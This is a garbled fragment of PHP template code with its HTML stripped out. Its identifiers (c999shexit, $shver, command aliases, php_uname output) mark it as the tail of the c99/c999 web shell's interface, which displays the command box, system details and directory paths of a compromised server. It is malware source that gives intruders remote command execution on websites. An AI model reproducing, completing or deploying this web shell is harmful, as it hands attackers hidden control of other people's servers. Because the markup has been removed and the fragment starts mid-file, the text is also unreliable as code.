...
?><?php echo $surl; ?><?php echo urlencode($d); ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo $surl; ?><?php echo $dispd; ?><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?><?php echo $surl; ?><?php echo urlencode($d); ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo wordwrap(php_uname()); ?><?php echo $surl; ?><?php echo urlencode($d); ?><?php echo $surl; ?><?php echo $surl; ?><?php echo $surl; ?><?php echo urlencode($d); ?><?php echo $dispd; ?><?php echo $surl; ?><?php echo $ud; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $shver; ?><?php echo $surl; ?><?php echo round(getmicrotime()-starttime,4); ?><?php chdir($lastdir); c999shexit(); ?>